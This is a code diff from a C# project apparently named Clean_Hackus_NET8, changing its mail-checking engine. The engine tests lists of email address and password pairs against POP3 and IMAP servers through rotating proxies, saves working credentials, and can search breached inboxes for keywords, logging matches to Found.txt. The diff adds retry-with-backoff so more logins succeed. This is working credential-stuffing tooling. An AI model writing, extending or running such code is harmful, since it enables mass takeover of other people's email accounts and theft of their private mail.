@@ -10,9 +10,9 @@ using Clean_Hackus_NET8.Services.Managers;
 namespace Clean_Hackus_NET8.Services;
 
 /// <summary>
-/// Core checking engine. For each mailbox, tries protocols in order:
-/// POP3 SSL → POP3 Non-SSL → IMAP SSL → IMAP Non-SSL
-/// When keywords are enabled, uses IMAP ONLY (keyword search requires IMAP SEARCH).
+/// Core checking engine with smart retry logic.
+/// Normal: POP3 SSL → Non-SSL → IMAP SSL → Non-SSL
+/// Keyword mode: IMAP only
 /// </summary>
 public class CheckerEngine
 {
@@ -21,26 +21,29 @@ public class CheckerEngine
     private readonly ProxyManager _proxies = ProxyManager.Instance;
     private readonly ResultsSaver _results = ResultsSaver.Instance;
 
-    /// <summary>
-    /// Check a single mailbox through the full fallback chain.
-    /// </summary>
+    private const int MAX_RETRIES = 2;
+    private static readonly int[] RETRY_DELAYS_MS = [500, 1500];
+
     public async Task CheckMailboxAsync(Mailbox mailbox, CancellationToken ct)
     {
         var domain = mailbox.Domain;
         var keywordMode = KeywordSettings.Instance.Enabled && KeywordSettings.Instance.HasKeywords;
 
-        // Gather all server configurations to try
         var serversToTry = BuildFallbackChain(domain, keywordMode);
 
+        // Auto-discover POP3 if no servers and not keyword mode
         if (serversToTry.Count == 0 && !keywordMode)
         {
-            // Try auto-discovering POP3 for this domain
-            var discovered = await ServerDiscovery.DiscoverPop3Async(domain, ct);
-            if (discovered != null)
+            try
             {
-                _serverDb.SavePop3ToCache(discovered);
-                serversToTry = BuildFallbackChain(domain, keywordMode);
+                var discovered = await ServerDiscovery.DiscoverPop3Async(domain, ct);
+                if (discovered != null)
+                {
+                    _serverDb.SavePop3ToCache(discovered);
+                    serversToTry = BuildFallbackChain(domain, keywordMode);
+                }
             }
+            catch { }
         }
 
         if (serversToTry.Count == 0)
@@ -50,12 +53,11 @@ public class CheckerEngine
             return;
         }
 
-        // Try each server in order
         foreach (var server in serversToTry)
         {
             ct.ThrowIfCancellationRequested();
 
-            var result = await TryServerAsync(mailbox, server, keywordMode, ct);
+            var result = await TryServerWithRetryAsync(mailbox, server, keywordMode, ct);
 
             switch (result)
             {
@@ -70,7 +72,7 @@ public class CheckerEngine
                     return;
 
                 case OperationResult.Error:
-                    continue;
+                    continue; // try next server
             }
         }
 
@@ -78,27 +80,38 @@ public class CheckerEngine
         await _results.SaveErrorAsync($"{mailbox.Address}:{mailbox.Password}");
     }
 
-    /// <summary>
-    /// Build the ordered fallback chain.
-    /// Normal: POP3 SSL → POP3 Non-SSL → IMAP SSL → IMAP Non-SSL
-    /// Keyword mode: IMAP SSL → IMAP Non-SSL ONLY
-    /// </summary>
+    /// <summary>Smart retry: retries connection errors with backoff, not auth failures.</summary>
+    private async Task<OperationResult> TryServerWithRetryAsync(Mailbox mailbox, Server server, bool keywordMode, CancellationToken ct)
+    {
+        for (int attempt = 0; attempt <= MAX_RETRIES; attempt++)
+        {
+            ct.ThrowIfCancellationRequested();
+
+            if (attempt > 0)
+                await Task.Delay(RETRY_DELAYS_MS[Math.Min(attempt - 1, RETRY_DELAYS_MS.Length - 1)], ct);
+
+            var result = await TryServerAsync(mailbox, server, keywordMode, ct);
+
+            // Only retry on connection Error, not on Bad (wrong password) or Ok
+            if (result != OperationResult.Error)
+                return result;
+        }
+
+        return OperationResult.Error;
+    }
+
     private List<Server> BuildFallbackChain(string domain, bool keywordMode)
     {
         var chain = new List<Server>();
 
         if (!keywordMode)
         {
-            // POP3 first
             var pop3 = _serverDb.GetPop3Servers(domain);
             if (pop3 != null)
             {
-                foreach (var s in pop3)
-                    if (s.Socket == SocketType.SSL) chain.Add(s);
-                foreach (var s in pop3)
-                    if (s.Socket == SocketType.Plain) chain.Add(s);
+                foreach (var s in pop3) if (s.Socket == SocketType.SSL) chain.Add(s);
+                foreach (var s in pop3) if (s.Socket == SocketType.Plain) chain.Add(s);
             }
-
             if (pop3 == null || pop3.Count == 0)
             {
                 chain.Add(new Server { Domain = domain, Hostname = $"pop.{domain}", Port = 995, Protocol = ProtocolType.POP3, Socket = SocketType.SSL });
@@ -106,16 +119,12 @@ public class CheckerEngine
             }
         }
 
-        // IMAP (always included)
         var imap = _serverDb.GetImapServers(domain);
         if (imap != null)
         {
-            foreach (var s in imap)
-                if (s.Socket == SocketType.SSL) chain.Add(s);
-            foreach (var s in imap)
-                if (s.Socket == SocketType.Plain) chain.Add(s);
+            foreach (var s in imap) if (s.Socket == SocketType.SSL) chain.Add(s);
+            foreach (var s in imap) if (s.Socket == SocketType.Plain) chain.Add(s);
         }
-
         if (imap == null || imap.Count == 0)
         {
             chain.Add(new Server { Domain = domain, Hostname = $"imap.{domain}", Port = 993, Protocol = ProtocolType.IMAP, Socket = SocketType.SSL });
@@ -125,10 +134,6 @@ public class CheckerEngine
         return chain;
     }
 
-    /// <summary>
-    /// Try connecting and logging in to a single server.
-    /// In keyword mode, also runs IMAP SEARCH after login.
-    /// </summary>
     private async Task<OperationResult> TryServerAsync(Mailbox mailbox, Server server, bool keywordMode, CancellationToken ct)
     {
         IMailHandler? handler = null;
@@ -144,7 +149,6 @@ public class CheckerEngine
             if (handler == null) return OperationResult.Error;
 
             var proxy = _proxies.GetNextProxy();
-
             var connectResult = await handler.ConnectAsync(proxy, ct);
             if (connectResult != OperationResult.Ok) return OperationResult.Error;
 
@@ -152,7 +156,6 @@ public class CheckerEngine
 
             if (loginResult == OperationResult.Ok && keywordMode && handler is ImapClient imapClient)
             {
-                // Run keyword search
                 var selectResult = await imapClient.SelectFolderAsync(new Folder { Name = "INBOX" }, ct);
                 if (selectResult == OperationResult.Ok)
                 {
@@ -161,8 +164,8 @@ public class CheckerEngine
                     if (uids.Count > 0)
                     {
                         _stats.IncrementFound();
-                        var capture = $"{mailbox.Address}:{mailbox.Password} | KEYWORD_MATCH ({uids.Count} msgs) | {server.Hostname}:{server.Port}";
-                        await _results.SaveAsync("Found.txt", capture);
+                        await _results.SaveAsync("Found.txt",
+                            $"{mailbox.Address}:{mailbox.Password} | KEYWORD ({uids.Count} msgs) | {server.Hostname}:{server.Port}");
                     }
                 }
             }
@@ -171,13 +174,7 @@ public class CheckerEngine
             return loginResult;
         }
         catch (OperationCanceledException) { throw; }
-        catch
-        {
-            return OperationResult.Error;
-        }
-        finally
-        {
-            handler?.Dispose();
-        }
+        catch { return OperationResult.Error; }
+        finally { handler?.Dispose(); }
     }
 }
